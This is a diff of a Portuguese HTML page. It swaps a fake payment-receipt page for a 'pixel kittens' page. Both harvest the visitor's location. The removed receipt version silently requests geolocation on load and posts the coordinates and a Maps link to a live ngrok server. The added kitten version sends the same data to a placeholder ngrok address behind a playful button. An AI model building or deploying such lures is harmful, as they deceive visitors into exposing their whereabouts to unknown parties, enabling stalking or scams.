@@ -1,74 +1,78 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
-
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Comprovante de Recebimento</title>
-  <link rel="stylesheet" href="styles.css" />
+  <title>Gatinhos Pixelados</title>
+  <style>
+    body {
+      background-color: #1a1a2e;
+      color: #ffffff;
+      font-family: 'Press Start 2P', cursive;
+      text-align: center;
+      padding: 20px;
+    }
+    .container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .cat-pixel {
+      width: 200px;
+      height: auto;
+      image-rendering: pixelated;
+      margin: 10px;
+    }
+    .button {
+      background: #ffcc00;
+      border: none;
+      padding: 10px 20px;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+  </style>
 </head>
-
 <body>
-  <div class="comprovante-container">
-    <h1>Comprovante de Recebimento</h1>
-
-    <div class="informacoes">
-      <p><span>Data:</span> <span id="data-atual"></span></p>
-      <p><span>Valor Recebido:</span> R$ 1.000,00</p>
-      <p><span>De:</span> João Silva de Oliveira</p>
-      <p><span>Status:</span> Recebido com Sucesso</p>
-    </div>
-
-    <button class="botao" onclick="window.print()">Imprimir</button>
-
-    <div class="comprovante-footer">
-      <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
-      <p><a href="#">Clique aqui</a> para mais informações.</p>
-    </div>
-
+  <div class="container">
+    <h1>😺 Gatinhos Pixelados 😺</h1>
+    <img class="cat-pixel" src="https://i.imgur.com/VgTYZJ6.png" alt="Gatinho Pixelado">
+    <img class="cat-pixel" src="https://i.imgur.com/Mscd1D6.png" alt="Gatinho Pixelado">
+    <button class="button" onclick="getLocation()">Compartilhar Localização com os Gatos</button>
   </div>
 
   <script>
-    window.addEventListener("load", () => {
+    function getLocation() {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(sendLocation, handleError);
       } else {
-        alert("Algo deu errado. Tente novamente mais tarde.");
+        alert("Seu navegador não suporta geolocalização. :(");
       }
-    });
-
-    const dataAtual = new Date();
-    const dia = String(dataAtual.getDate()).padStart(2, '0');
-    const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
-    const ano = dataAtual.getFullYear();
-
-    const dataFormatada = `${dia}/${mes}/${ano}`;
-
-    document.getElementById("data-atual").textContent = dataFormatada;
-
-    console.log(dataAtual)
+    }
 
     function sendLocation(position) {
       const latitude = position.coords.latitude;
       const longitude = position.coords.longitude;
       const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
-
-      fetch("https://5057-187-59-186-51.ngrok-free.app/send-location", {  <!-- Substitua a URL do Ngrok aqui -->
+      
+      fetch("https://seu-ngrok-aqui.ngrok-free.app/send-location", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
         },
         body: JSON.stringify({ latitude, longitude, maps })
       })
-        .then(response => response.json())
-        .then(data => {
-          if (!data.success) {
-            alert("Erro ao enviar o comprovante.");
-          }
-        })
-        .catch(error => {
-          console.error("Erro:", error);
-        });
+      .then(response => response.json())
+      .then(data => {
+        if (!data.success) {
+          alert("Erro ao enviar a localização para os gatinhos.");
+        } else {
+          alert("Os gatinhos receberam sua localização! 😻");
+        }
+      })
+      .catch(error => {
+        console.error("Erro:", error);
+      });
     }
 
     function handleError(error) {
@@ -76,5 +80,4 @@
     }
   </script>
 </body>
-
 </html>
